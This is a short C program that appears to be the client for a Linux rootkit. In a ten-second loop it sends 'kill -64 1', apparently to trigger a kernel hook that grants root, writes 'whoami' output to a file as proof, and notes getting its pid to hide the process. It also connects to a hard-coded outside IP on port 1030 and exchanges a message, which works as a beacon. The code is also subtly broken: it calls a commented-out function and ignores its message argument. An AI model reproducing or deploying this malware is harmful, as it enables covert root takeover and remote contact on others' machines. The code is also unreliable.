#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>
#define PORT 1030

/*static void test_connection(void)
{
	char cmd[] = "curl -I https://stackoverflow.com/";
    system(cmd);
}*/

int send_server(char *message)
{
   int sock = 0, valread, client_fd;
    struct sockaddr_in serv_addr;
    char* hello = "Hello from client";
    char buffer[1024] = { 0 };
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        printf("\n Socket creation error \n");
        return -1;
    }
 
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);
 
    // Convert IPv4 and IPv6 addresses from text to binary
    // form
    if (inet_pton(AF_INET, "47.88.90.66", &serv_addr.sin_addr)
        <= 0) {
        printf(
            "\nInvalid address/ Address not supported \n");
        return -1;
    }
 
    if ((client_fd
         = connect(sock, (struct sockaddr*)&serv_addr,
                   sizeof(serv_addr)))
        < 0) {
        printf("\nConnection Failed \n");
        return -1;
    }
    send(sock, hello, strlen(hello), 0);
    printf("Hello message sent\n");
    valread = read(sock, buffer, 1024);
    printf("%s\n", buffer);
 
    // closing the connected socket
    close(client_fd);
    return 0;
}

int get_root(void)
{
    system("kill -64 1");
    
    // prove that root was gained
    system("whoami > /home/debian/test.txt");

    // get pid to hide process
    int pid = getpid();
    printf("pid is %d\n", pid);

    return 0;
}

int main(int argc, char *argv[]) 
{

    while(1)
    {
        sleep(10);
        test_connection();
        get_root();
        send_server("GET / HTTP/1.1\r");
    }

    return 0;
}